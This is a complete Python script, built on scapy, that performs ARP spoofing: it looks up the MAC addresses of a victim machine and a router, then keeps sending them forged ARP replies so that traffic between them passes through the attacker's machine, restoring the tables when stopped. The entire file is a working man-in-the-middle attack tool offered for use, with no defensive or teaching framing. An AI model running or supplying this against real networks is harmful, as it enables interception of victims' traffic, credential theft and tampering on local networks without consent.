#!/usr/bin/env python3
from scapy.all import Ether, ARP, sendp, srp, conf
import sys
import time
import signal

# Set scapy to be less verbose
conf.verb = 0

def signal_handler(sig, frame):
    print("\n[!] Stopping attack and restoring ARP tables...")
    restore_arp(victim_ip, router_ip, victim_mac, router_mac)
    sys.exit(0)

def get_mac(ip):
    try:
        # Create ARP request packet
        arp_request = ARP(pdst=ip)
        # Create Ethernet frame
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        # Combine them
        arp_request_broadcast = broadcast/arp_request
        
        # Send and receive packets with timeout
        answered, unanswered = srp(arp_request_broadcast, timeout=2, retry=2, iface=conf.iface)
        
        # Extract MAC address from the response
        if answered:
            return answered[0][1].hwsrc
        else:
            print(f"[-] No response for IP: {ip}")
            return None
            
    except Exception as e:
        print(f"[-] Error getting MAC for {ip}: {e}")
        return None

def spoof_arp(target_ip, spoof_ip, target_mac):
    try:
        packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        sendp(packet, verbose=False)
    except Exception as e:
        print(f"[-] Error in spoof_arp: {e}")

def restore_arp(dest_ip, src_ip, dest_mac, src_mac):
    try:
        packet1 = Ether(dst=dest_mac)/ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
        packet2 = Ether(dst=src_mac)/ARP(op=2, pdst=src_ip, hwdst=src_mac, psrc=dest_ip, hwsrc=dest_mac)
        sendp(packet1, count=4, inter=0.1, verbose=False)
        sendp(packet2, count=4, inter=0.1, verbose=False)
        print("[+] ARP tables restored")
    except Exception as e:
        print(f"[-] Error restoring ARP: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: sudo python3 arp-spoof.py <Victim_IP> <Router_IP>")
        sys.exit(1)

    victim_ip = sys.argv[1]
    router_ip = sys.argv[2]

    print("[*] Getting MAC addresses...")
    
    # Try getting MAC addresses multiple times
    max_retries = 3
    for attempt in range(max_retries):
        victim_mac = get_mac(victim_ip)
        router_mac = get_mac(router_ip)
        
        if victim_mac and router_mac:
            break
            
        print(f"[*] Retrying ({attempt + 1}/{max_retries})...")
        time.sleep(1)

    if not victim_mac:
        print(f"[-] Failed to get victim MAC address for {victim_ip}")
    if not router_mac:
        print(f"[-] Failed to get router MAC address for {router_ip}")
    if not victim_mac or not router_mac:
        sys.exit(1)

    print(f"[+] Victim MAC: {victim_mac}")
    print(f"[+] Router MAC: {router_mac}")

    signal.signal(signal.SIGINT, signal_handler)
    print("[*] Starting ARP spoofing. Press Ctrl+C to stop.")
    
    try:
        while True:
            spoof_arp(victim_ip, router_ip, victim_mac)
            spoof_arp(router_ip, victim_ip, router_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        signal_handler(None, None)
    except Exception as e:
        print(f"[-] Error: {e}")
        restore_arp(victim_ip, router_ip, victim_mac, router_mac)